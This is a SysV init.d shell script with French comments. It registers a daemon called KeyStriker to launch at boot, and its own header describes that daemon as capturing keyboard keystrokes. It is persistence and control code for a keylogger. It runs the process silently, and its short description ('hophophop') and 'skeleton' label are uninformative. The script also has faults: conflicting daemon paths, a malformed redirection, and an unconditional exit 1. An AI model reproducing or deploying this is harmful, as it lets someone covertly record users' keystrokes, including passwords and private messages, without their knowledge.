#!/bin/bash

if [ true != "$INIT_D_SCRIPT_SOURCED" ] ; then
    set "$0" "$@"; INIT_D_SCRIPT_SOURCED=true . /lib/init/init-d-script
fi
### BEGIN INIT INFO
# Provides:          skeleton
# Required-Start:    $remote_fs $syslog
# Required-Stop:     $remote_fs $syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Short-Description: hophophop
# Description:       Récupère les frappes du clavier
### END INIT INFO

DESC="Programme:"
DAEMON=/usr/sbin/KeyStriker

PATH=/bin:/usr/bin:/sbin:/usr/sbin

# Optionnel : définit le nom qui s'affichera

# lors du démarrage ou de l'arrêt du du démon

NAME=KeyStriker

# Emplacement du binaire du démon

DAEMON=/usr/bin/KeyStriker

# On vérifie que le programme du démon

# est exécutable, sinon fin du script.

test -x $DAEMON || exit 0

case "$1" in

    start)

# On vérifie si le démon

        # n'est pas déjà lancé.

        if [ -z "$(ps -A | grep $NAME)" ]

then

            echo "$NAME : lancement du démon."

            $NAME & >& /dev/null

        fi

;;

    stop)


        echo "$NAME : arrêt du démon."

        killall -9 $NAME >& /dev/null

        ;;

    restart)

        $0 stop

        sleep 1

        $0 start

        ;;

    status)

        echo -n "$NAME : "

        if [ -z "$(ps -A | grep $NAME)" ]

then

            echo "le démon n'est pas lancé."

        else

            echo "le démon est lancé."

        fi

        ;;

    *)

        echo "Usage: $0 start|stop|restart|status" >&2

        exit 1

        ;;

esac

exit 1
